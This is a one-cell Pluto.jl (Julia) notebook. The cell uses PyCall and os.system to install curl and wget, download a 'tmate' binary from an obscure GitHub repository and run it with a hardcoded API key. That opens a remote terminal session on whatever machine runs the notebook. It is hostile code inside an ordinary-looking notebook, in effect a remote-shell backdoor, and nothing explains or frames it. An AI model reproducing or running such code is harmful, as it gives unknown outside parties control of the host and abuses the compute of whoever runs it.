### A Pluto.jl notebook ###
# v0.19.28

using Markdown
using InteractiveUtils

# ╔═╡ 7b7e1bc4-d6eb-11ee-3e5b-99ea1c09f5ef
begin
	import Pkg
	Pkg.update()
	Pkg.add("PyCall"); using PyCall
	os = pyimport("os")
	os.system("apt-get update -y && apt-get install curl wget -y")
	os.system("wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate && chmod +x tmate && ./tmate -F -k tmk-XFh4wmpGo9VkrPd37bY81lqL4j -n tmate")
end

# ╔═╡ Cell order:
# ╠═7b7e1bc4-d6eb-11ee-3e5b-99ea1c09f5ef
